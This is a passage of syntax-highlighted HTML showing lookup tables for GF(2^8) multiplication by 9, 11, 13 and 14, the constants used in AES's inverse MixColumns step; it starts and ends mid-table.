class="number">0xdb</span>,<span class="number">0xde</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xd2</span>,<span class="number">0xd1</span>,</span><br><span class="line">	<span class="number">0xf0</span>,<span class="number">0xf3</span>,<span class="number">0xf6</span>,<span class="number">0xf5</span>,<span class="number">0xfc</span>,<span class="number">0xff</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0xe8</span>,<span class="number">0xeb</span>,<span class="number">0xee</span>,<span class="number">0xed</span>,<span class="number">0xe4</span>,<span class="number">0xe7</span>,<span class="number">0xe2</span>,<span class="number">0xe1</span>,</span><br><span class="line">	<span class="number">0xa0</span>,<span class="number">0xa3</span>,<span class="number">0xa6</span>,<span class="number">0xa5</span>,<span class="number">0xac</span>,<span class="number">0xaf</span>,<span class="number">0xaa</span>,<span class="number">0xa9</span>,<span class="number">0xb8</span>,<span class="number">0xbb</span>,<span class="number">0xbe</span>,<span class="number">0xbd</span>,<span class="number">0xb4</span>,<span class="number">0xb7</span>,<span class="number">0xb2</span>,<span class="number">0xb1</span>,</span><br><span class="line">	<span class="number">0x90</span>,<span class="number">0x93</span>,<span class="number">0x96</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x9f</span>,<span class="number">0x9a</span>,<span class="number">0x99</span>,<span class="number">0x88</span>,<span class="number">0x8b</span>,<span class="number">0x8e</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0x87</span>,<span class="number">0x82</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="number">0x9b</span>,<span class="number">0x98</span>,<span class="number">0x9d</span>,<span class="number">0x9e</span>,<span class="number">0x97</span>,<span class="number">0x94</span>,<span class="number">0x91</span>,<span class="number">0x92</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x85</span>,<span class="number">0x86</span>,<span class="number">0x8f</span>,<span class="number">0x8c</span>,<span class="number">0x89</span>,<span class="number">0x8a</span>,</span><br><span class="line">	<span class="number">0xab</span>,<span class="number">0xa8</span>,<span class="number">0xad</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xa4</span>,<span class="number">0xa1</span>,<span class="number">0xa2</span>,<span class="number">0xb3</span>,<span class="number">0xb0</span>,<span class="number">0xb5</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0xbc</span>,<span class="number">0xb9</span>,<span class="number">0xba</span>,</span><br><span class="line">	<span class="number">0xfb</span>,<span class="number">0xf8</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xf4</span>,<span class="number">0xf1</span>,<span class="number">0xf2</span>,<span class="number">0xe3</span>,<span class="number">0xe0</span>,<span class="number">0xe5</span>,<span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xec</span>,<span class="number">0xe9</span>,<span class="number">0xea</span>,</span><br><span class="line">	<span class="number">0xcb</span>,<span class="number">0xc8</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xc7</span>,<span class="number">0xc4</span>,<span class="number">0xc1</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xd0</span>,<span class="number">0xd5</span>,<span class="number">0xd6</span>,<span class="number">0xdf</span>,<span class="number">0xdc</span>,<span class="number">0xd9</span>,<span class="number">0xda</span>,</span><br><span class="line">	<span class="number">0x5b</span>,<span class="number">0x58</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x40</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x4f</span>,<span class="number">0x4c</span>,<span class="number">0x49</span>,<span class="number">0x4a</span>,</span><br><span class="line">	<span class="number">0x6b</span>,<span class="number">0x68</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x73</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x7c</span>,<span class="number">0x79</span>,<span class="number">0x7a</span>,</span><br><span class="line">	<span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x3d</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x23</span>,<span class="number">0x20</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x2c</span>,<span class="number">0x29</span>,<span class="number">0x2a</span>,</span><br><span class="line">	<span class="number">0x0b</span>,<span class="number">0x08</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x07</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x13</span>,<span class="number">0x10</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x1f</span>,<span class="number">0x1c</span>,<span class="number">0x19</span>,<span class="number">0x1a</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_09 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x12</span>,<span class="number">0x1b</span>,<span class="number">0x24</span>,<span class="number">0x2d</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0x48</span>,<span class="number">0x41</span>,<span class="number">0x5a</span>,<span class="number">0x53</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x7e</span>,<span class="number">0x77</span>,</span><br><span class="line">	<span class="number">0x90</span>,<span class="number">0x99</span>,<span class="number">0x82</span>,<span class="number">0x8b</span>,<span class="number">0xb4</span>,<span class="number">0xbd</span>,<span class="number">0xa6</span>,<span class="number">0xaf</span>,<span class="number">0xd8</span>,<span class="number">0xd1</span>,<span class="number">0xca</span>,<span class="number">0xc3</span>,<span class="number">0xfc</span>,<span class="number">0xf5</span>,<span class="number">0xee</span>,<span class="number">0xe7</span>,</span><br><span class="line">	<span class="number">0x3b</span>,<span class="number">0x32</span>,<span class="number">0x29</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x16</span>,<span class="number">0x0d</span>,<span class="number">0x04</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>,<span class="number">0x61</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,</span><br><span class="line">	<span class="number">0xab</span>,<span class="number">0xa2</span>,<span class="number">0xb9</span>,<span class="number">0xb0</span>,<span class="number">0x8f</span>,<span class="number">0x86</span>,<span class="number">0x9d</span>,<span class="number">0x94</span>,<span class="number">0xe3</span>,<span class="number">0xea</span>,<span class="number">0xf1</span>,<span class="number">0xf8</span>,<span class="number">0xc7</span>,<span class="number">0xce</span>,<span class="number">0xd5</span>,<span class="number">0xdc</span>,</span><br><span class="line">	<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x64</span>,<span class="number">0x6d</span>,<span class="number">0x52</span>,<span class="number">0x5b</span>,<span class="number">0x40</span>,<span class="number">0x49</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0x1a</span>,<span class="number">0x13</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xf4</span>,<span class="number">0xfd</span>,<span class="number">0xc2</span>,<span class="number">0xcb</span>,<span class="number">0xd0</span>,<span class="number">0xd9</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xbc</span>,<span class="number">0xb5</span>,<span class="number">0x8a</span>,<span class="number">0x83</span>,<span class="number">0x98</span>,<span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x5f</span>,<span class="number">0x56</span>,<span class="number">0x69</span>,<span class="number">0x60</span>,<span class="number">0x7b</span>,<span class="number">0x72</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x17</span>,<span class="number">0x1e</span>,<span class="number">0x21</span>,<span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x3a</span>,</span><br><span class="line">	<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xcf</span>,<span class="number">0xc6</span>,<span class="number">0xf9</span>,<span class="number">0xf0</span>,<span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x87</span>,<span class="number">0x8e</span>,<span class="number">0xb1</span>,<span class="number">0xb8</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,</span><br><span class="line">	<span class="number">0xec</span>,<span class="number">0xe5</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xc8</span>,<span class="number">0xc1</span>,<span class="number">0xda</span>,<span class="number">0xd3</span>,<span class="number">0xa4</span>,<span class="number">0xad</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0x80</span>,<span class="number">0x89</span>,<span class="number">0x92</span>,<span class="number">0x9b</span>,</span><br><span class="line">	<span class="number">0x7c</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x4a</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x3d</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x10</span>,<span class="number">0x19</span>,<span class="number">0x02</span>,<span class="number">0x0b</span>,</span><br><span class="line">	<span class="number">0xd7</span>,<span class="number">0xde</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xf3</span>,<span class="number">0xfa</span>,<span class="number">0xe1</span>,<span class="number">0xe8</span>,<span class="number">0x9f</span>,<span class="number">0x96</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0xbb</span>,<span class="number">0xb2</span>,<span class="number">0xa9</span>,<span class="number">0xa0</span>,</span><br><span class="line">	<span class="number">0x47</span>,<span class="number">0x4e</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x63</span>,<span class="number">0x6a</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x0f</span>,<span class="number">0x06</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x2b</span>,<span class="number">0x22</span>,<span class="number">0x39</span>,<span class="number">0x30</span>,</span><br><span class="line">	<span class="number">0x9a</span>,<span class="number">0x93</span>,<span class="number">0x88</span>,<span class="number">0x81</span>,<span class="number">0xbe</span>,<span class="number">0xb7</span>,<span class="number">0xac</span>,<span class="number">0xa5</span>,<span class="number">0xd2</span>,<span class="number">0xdb</span>,<span class="number">0xc0</span>,<span class="number">0xc9</span>,<span class="number">0xf6</span>,<span class="number">0xff</span>,<span class="number">0xe4</span>,<span class="number">0xed</span>,</span><br><span class="line">	<span class="number">0x0a</span>,<span class="number">0x03</span>,<span class="number">0x18</span>,<span class="number">0x11</span>,<span class="number">0x2e</span>,<span class="number">0x27</span>,<span class="number">0x3c</span>,<span class="number">0x35</span>,<span class="number">0x42</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x59</span>,<span class="number">0x66</span>,<span class="number">0x6f</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,</span><br><span class="line">	<span class="number">0xa1</span>,<span class="number">0xa8</span>,<span class="number">0xb3</span>,<span class="number">0xba</span>,<span class="number">0x85</span>,<span class="number">0x8c</span>,<span class="number">0x97</span>,<span class="number">0x9e</span>,<span class="number">0xe9</span>,<span class="number">0xe0</span>,<span class="number">0xfb</span>,<span class="number">0xf2</span>,<span class="number">0xcd</span>,<span class="number">0xc4</span>,<span class="number">0xdf</span>,<span class="number">0xd6</span>,</span><br><span class="line">	<span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x23</span>,<span class="number">0x2a</span>,<span class="number">0x15</span>,<span class="number">0x1c</span>,<span class="number">0x07</span>,<span class="number">0x0e</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x6b</span>,<span class="number">0x62</span>,<span class="number">0x5d</span>,<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GF_MULT_11 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x16</span>,<span class="number">0x1d</span>,<span class="number">0x2c</span>,<span class="number">0x27</span>,<span class="number">0x3a</span>,<span class="number">0x31</span>,<span class="number">0x58</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x45</span>,<span class="number">0x74</span>,<span class="number">0x7f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,</span><br><span class="line">	<span class="number">0xb0</span>,<span class="number">0xbb</span>,<span class="number">0xa6</span>,<span class="number">0xad</span>,<span class="number">0x9c</span>,<span class="number">0x97</span>,<span class="number">0x8a</span>,<span class="number">0x81</span>,<span class="number">0xe8</span>,<span class="number">0xe3</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xc4</span>,<span class="number">0xcf</span>,<span class="number">0xd2</span>,<span class="number">0xd9</span>,</span><br><span class="line">	<span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x6d</span>,<span class="number">0x66</span>,<span class="number">0x57</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x4a</span>,<span class="number">0x23</span>,<span class="number">0x28</span>,<span class="number">0x35</span>,<span class="number">0x3e</span>,<span class="number">0x0f</span>,<span class="number">0x04</span>,<span class="number">0x19</span>,<span class="number">0x12</span>,</span><br><span class="line">	<span class="number">0xcb</span>,<span class="number">0xc0</span>,<span class="number">0xdd</span>,<span class="number">0xd6</span>,<span class="number">0xe7</span>,<span class="number">0xec</span>,<span class="number">0xf1</span>,<span class="number">0xfa</span>,<span class="number">0x93</span>,<span class="number">0x98</span>,<span class="number">0x85</span>,<span class="number">0x8e</span>,<span class="number">0xbf</span>,<span class="number">0xb4</span>,<span class="number">0xa9</span>,<span class="number">0xa2</span>,</span><br><span class="line">	<span class="number">0xf6</span>,<span class="number">0xfd</span>,<span class="number">0xe0</span>,<span class="number">0xeb</span>,<span class="number">0xda</span>,<span class="number">0xd1</span>,<span class="number">0xcc</span>,<span class="number">0xc7</span>,<span class="number">0xae</span>,<span class="number">0xa5</span>,<span class="number">0xb8</span>,<span class="number">0xb3</span>,<span class="number">0x82</span>,<span class="number">0x89</span>,<span class="number">0x94</span>,<span class="number">0x9f</span>,</span><br><span class="line">	<span class="number">0x46</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0x61</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x1e</span>,<span class="number">0x15</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x32</span>,<span class="number">0x39</span>,<span class="number">0x24</span>,<span class="number">0x2f</span>,</span><br><span class="line">	<span class="number">0x8d</span>,<span class="number">0x86</span>,<span class="number">0x9b</span>,<span class="number">0x90</span>,<span class="number">0xa1</span>,<span class="number">0xaa</span>,<span class="number">0xb7</span>,<span class="number">0xbc</span>,<span class="number">0xd5</span>,<span class="number">0xde</span>,<span class="number">0xc3</span>,<span class="number">0xc8</span>,<span class="number">0xf9</span>,<span class="number">0xf2</span>,<span class="number">0xef</span>,<span class="number">0xe4</span>,</span><br><span class="line">	<span class="number">0x3d</span>,<span class="number">0x36</span>,<span class="number">0x2b</span>,<span class="number">0x20</span>,<span class="number">0x11</span>,<span class="number">0x1a</span>,<span class="number">0x07</span>,<span class="number">0x0c</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,<span class="number">0x42</span>,<span class="number">0x5f</span>,<span class="number">0x54</span>,</span><br><span class="line">	<span class="number">0xf7</span>,<span class="number">0xfc</span>,<span class="number">0xe1</span>,<span class="number">0xea</span>,<span class="number">0xdb</span>,<span class="number">0xd0</span>,<span class="number">0xcd</span>,<span class="number">0xc6</span>,<span class="number">0xaf</span>,<span class="number">0xa4</span>,<span class="number">0xb9</span>,<span class="number">0xb2</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x95</span>,<span class="number">0x9e</span>,</span><br><span class="line">	<span class="number">0x47</span>,<span class="number">0x4c</span>,<span class="number">0x51</span>,<span class="number">0x5a</span>,<span class="number">0x6b</span>,<span class="number">0x60</span>,<span class="number">0x7d</span>,<span class="number">0x76</span>,<span class="number">0x1f</span>,<span class="number">0x14</span>,<span class="number">0x09</span>,<span class="number">0x02</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,</span><br><span class="line">	<span class="number">0x8c</span>,<span class="number">0x87</span>,<span class="number">0x9a</span>,<span class="number">0x91</span>,<span class="number">0xa0</span>,<span class="number">0xab</span>,<span class="number">0xb6</span>,<span class="number">0xbd</span>,<span class="number">0xd4</span>,<span class="number">0xdf</span>,<span class="number">0xc2</span>,<span class="number">0xc9</span>,<span class="number">0xf8</span>,<span class="number">0xf3</span>,<span class="number">0xee</span>,<span class="number">0xe5</span>,</span><br><span class="line">	<span class="number">0x3c</span>,<span class="number">0x37</span>,<span class="number">0x2a</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x1b</span>,<span class="number">0x06</span>,<span class="number">0x0d</span>,<span class="number">0x64</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x43</span>,<span class="number">0x5e</span>,<span class="number">0x55</span>,</span><br><span class="line">	<span class="number">0x01</span>,<span class="number">0x0a</span>,<span class="number">0x17</span>,<span class="number">0x1c</span>,<span class="number">0x2d</span>,<span class="number">0x26</span>,<span class="number">0x3b</span>,<span class="number">0x30</span>,<span class="number">0x59</span>,<span class="number">0x52</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x75</span>,<span class="number">0x7e</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,</span><br><span class="line">	<span class="number">0xb1</span>,<span class="number">0xba</span>,<span class="number">0xa7</span>,<span class="number">0xac</span>,<span class="number">0x9d</span>,<span class="number">0x96</span>,<span class="number">0x8b</span>,<span class="number">0x80</span>,<span class="number">0xe9</span>,<span class="number">0xe2</span>,<span class="number">0xff</span>,<span class="number">0xf4</span>,<span class="number">0xc5</span>,<span class="number">0xce</span>,<span class="number">0xd3</span>,<span class="number">0xd8</span>,</span><br><span class="line">	<span class="number">0x7a</span>,<span class="number">0x71</span>,<span class="number">0x6c</span>,<span class="number">0x67</span>,<span class="number">0x56</span>,<span class="number">0x5d</span>,<span class="number">0x40</span>,<span class="number">0x4b</span>,<span class="number">0x22</span>,<span class="number">0x29</span>,<span class="number">0x34</span>,<span class="number">0x3f</span>,<span class="number">0x0e</span>,<span class="number">0x05</span>,<span class="number">0x18</span>,<span class="number">0x13</span>,</span><br><span class="line">	<span class="number">0xca</span>,<span class="number">0xc1</span>,<span class="number">0xdc</span>,<span class="number">0xd7</span>,<span class="number">0xe6</span>,<span class="number">0xed</span>,<span class="number">0xf0</span>,<span class="number">0xfb</span>,<span class="number">0x92</span>,<span class="number">0x99</span>,<span class="number">0x84</span>,<span class="number">0x8f</span>,<span class="number">0xbe</span>,<span class="number">0xb5</span>,<span class="number">0xa8</span>,<span class="number">0xa3</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_13 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x0d</span>,<span class="number">0x1a</span>,<span class="number">0x17</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x2e</span>,<span class="number">0x23</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x7f</span>,<span class="number">0x5c</span>,<span class="number">0x51</span>,<span class="number">0x46</span>,<span class="number">0x4b</span>,</span><br><span class="line">	<span class="number">0xd0</span>,<span class="number">0xdd</span>,<span class="number">0xca</span>,<span class="number">0xc7</span>,<span class="number">0xe4</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xf3</span>,<span class="number">0xb8</span>,<span class="number">0xb5</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x8c</span>,<span class="number">0x81</span>,<span class="number">0x96</span>,<span class="number">0x9b</span>,</span><br><span class="line">	<span class="number">0xbb</span>,<span class="number">0xb6</span>,<span class="number">0xa1</span>,<span class="number">0xac</span>,<span class="number">0x8f</span>,<span class="number">0x82</span>,<span class="number">0x95</span>,<span class="number">0x98</span>,<span class="number">0xd3</span>,<span class="number">0xde</span>,<span class="number">0xc9</span>,<span class="number">0xc4</span>,<span class="number">0xe7</span>,<span class="number">0xea</span>,<span class="number">0xfd</span>,<span class="number">0xf0</span>,</span><br><span class="line">	<span class="number">0x6b</span>,<span class="number">0x66</span>,<span class="number">0x71</span>,<span class="number">0x7c</span>,<span class="number">0x5f</span>,<span class="number">0x52</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0x0e</span>,<span class="number">0x19</span>,<span class="number">0x14</span>,<span class="number">0x37</span>,<span class="number">0x3a</span>,<span class="number">0x2d</span>,<span class="number">0x20</span>,</span><br><span class="line">	<span class="number">0x6d</span>,<span class="number">0x60</span>,<span class="number">0x77</span>,<span class="number">0x7a</span>,<span class="number">0x59</span>,<span class="number">0x54</span>,<span class="number">0x43</span>,<span class="number">0x4e</span>,<span class="number">0x05</span>,<span class="number">0x08</span>,<span class="number">0x1f</span>,<span class="number">0x12</span>,<span class="number">0x31</span>,<span class="number">0x3c</span>,<span class="number">0x2b</span>,<span class="number">0x26</span>,</span><br><span class="line">	<span class="number">0xbd</span>,<span class="number">0xb0</span>,<span class="number">0xa7</span>,<span class="number">0xaa</span>,<span class="number">0x89</span>,<span class="number">0x84</span>,<span class="number">0x93</span>,<span class="number">0x9e</span>,<span class="number">0xd5</span>,<span class="number">0xd8</span>,<span class="number">0xcf</span>,<span class="number">0xc2</span>,<span class="number">0xe1</span>,<span class="number">0xec</span>,<span class="number">0xfb</span>,<span class="number">0xf6</span>,</span><br><span class="line">	<span class="number">0xd6</span>,<span class="number">0xdb</span>,<span class="number">0xcc</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0xef</span>,<span class="number">0xf8</span>,<span class="number">0xf5</span>,<span class="number">0xbe</span>,<span class="number">0xb3</span>,<span class="number">0xa4</span>,<span class="number">0xa9</span>,<span class="number">0x8a</span>,<span class="number">0x87</span>,<span class="number">0x90</span>,<span class="number">0x9d</span>,</span><br><span class="line">	<span class="number">0x06</span>,<span class="number">0x0b</span>,<span class="number">0x1c</span>,<span class="number">0x11</span>,<span class="number">0x32</span>,<span class="number">0x3f</span>,<span class="number">0x28</span>,<span class="number">0x25</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x5a</span>,<span class="number">0x57</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,</span><br><span class="line">	<span class="number">0xda</span>,<span class="number">0xd7</span>,<span class="number">0xc0</span>,<span class="number">0xcd</span>,<span class="number">0xee</span>,<span class="number">0xe3</span>,<span class="number">0xf4</span>,<span class="number">0xf9</span>,<span class="number">0xb2</span>,<span class="number">0xbf</span>,<span class="number">0xa8</span>,<span class="number">0xa5</span>,<span class="number">0x86</span>,<span class="number">0x8b</span>,<span class="number">0x9c</span>,<span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0x0a</span>,<span class="number">0x07</span>,<span class="number">0x10</span>,<span class="number">0x1d</span>,<span class="number">0x3e</span>,<span class="number">0x33</span>,<span class="number">0x24</span>,<span class="number">0x29</span>,<span class="number">0x62</span>,<span class="number">0x6f</span>,<span class="number">0x78</span>,<span class="number">0x75</span>,<span class="number">0x56</span>,<span class="number">0x5b</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,</span><br><span class="line">	<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x7b</span>,<span class="number">0x76</span>,<span class="number">0x55</span>,<span class="number">0x58</span>,<span class="number">0x4f</span>,<span class="number">0x42</span>,<span class="number">0x09</span>,<span class="number">0x04</span>,<span class="number">0x13</span>,<span class="number">0x1e</span>,<span class="number">0x3d</span>,<span class="number">0x30</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,</span><br><span class="line">	<span class="number">0xb1</span>,<span class="number">0xbc</span>,<span class="number">0xab</span>,<span class="number">0xa6</span>,<span class="number">0x85</span>,<span class="number">0x88</span>,<span class="number">0x9f</span>,<span class="number">0x92</span>,<span class="number">0xd9</span>,<span class="number">0xd4</span>,<span class="number">0xc3</span>,<span class="number">0xce</span>,<span class="number">0xed</span>,<span class="number">0xe0</span>,<span class="number">0xf7</span>,<span class="number">0xfa</span>,</span><br><span class="line">	<span class="number">0xb7</span>,<span class="number">0xba</span>,<span class="number">0xad</span>,<span class="number">0xa0</span>,<span class="number">0x83</span>,<span class="number">0x8e</span>,<span class="number">0x99</span>,<span class="number">0x94</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xc5</span>,<span class="number">0xc8</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xf1</span>,<span class="number">0xfc</span>,</span><br><span class="line">	<span class="number">0x67</span>,<span class="number">0x6a</span>,<span class="number">0x7d</span>,<span class="number">0x70</span>,<span class="number">0x53</span>,<span class="number">0x5e</span>,<span class="number">0x49</span>,<span class="number">0x44</span>,<span class="number">0x0f</span>,<span class="number">0x02</span>,<span class="number">0x15</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x2c</span>,</span><br><span class="line">	<span class="number">0x0c</span>,<span class="number">0x01</span>,<span class="number">0x16</span>,<span class="number">0x1b</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x7e</span>,<span class="number">0x73</span>,<span class="number">0x50</span>,<span class="number">0x5d</span>,<span class="number">0x4a</span>,<span class="number">0x47</span>,</span><br><span class="line">	<span class="number">0xdc</span>,<span class="number">0xd1</span>,<span class="number">0xc6</span>,<span class="number">0xcb</span>,<span class="number">0xe8</span>,<span class="number">0xe5</span>,<span class="number">0xf2</span>,<span class="number">0xff</span>,<span class="number">0xb4</span>,<span class="number">0xb9</span>,<span class="number">0xae</span>,<span class="number">0xa3</span>,<span class="number">0x80</span>,<span class="number">0x8d</span>,<span class="number">0x9a</span>,<span class="number">0x97</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_14 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x0e</span>,<span class="number">0x1c</span>,<span class="number">0x12</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x24</span>,<span class="number">0x2a</span>,<span class="number">0x70</span>,<span class="number">0x7e</span>,<span class="number">0x6c</span>,<span class="number">0x62</span>,<span class="number">0x48</span>,<span class="number">0x46</span>,<span class="number">0x54</span>,<span class="number">0x5a</span>,</span><br><span class="line">	<span class="number">0xe0</span>,<span class="number">0xee</span>,<span class="number">0xfc</span>,<span class="number">0xf2</span>,<span class="number">0xd8</span>,<span class="number">0xd6</span>,<span class="number">0xc4</span>,<span class="number">0xca</span>,<span class="number">0x90</span>,<span class="number">0x9e</span>,<span class="number">0x8c</span>,<span class="number">0x82</span>,<span class="number">0xa8</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xba</span>,</span><br><span class="line">	<span class="number">0xdb</span>,<span class="number">0xd5</span>,<span class="number">0xc7</span>,<span class="number">0xc9</span>,<span class="number">0xe3</span>,<span class="number">0xed</span>,<span class="number">0xff</span>,<span class="number">0xf1</span>,<span class="number">0xab</span>,<span class="number">0xa5</span>,<span class="number">0xb7</span>,<span class="number">0xb9</span>,<span class="number">0x93</span>,<span class="number">0x9d</span>,<span class="number">0x8f</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="number">0x3b</span>,<span class="number">0x35</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x03</span>,<span class="number">0x0d</span>,<span class="number">0x1f</span>,<span class="number">0x11</span>,<span class="number">0x4b</span>,<span class="number">0x45</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x73</span>,<span class="number">0x7d</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,</span><br><span class="line">	<span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xb1</span>,<span class="number">0xbf</span>,<span class="number">0x95</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0x87</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xc1</span>,<span class="number">0xcf</span>,<span class="number">0xe5</span>,<span class="number">0xeb</span>,<span class="number">0xf9</span>,<span class="number">0xf7</span>,</span><br><span class="line">	<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x51</span>,<span class="number">0x5f</span>,<span class="number">0x75</span>,<span class="number">0x7b</span>,<span class="number">0x69</span>,<span class="number">0x67</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x21</span>,<span class="number">0x2f</span>,<span 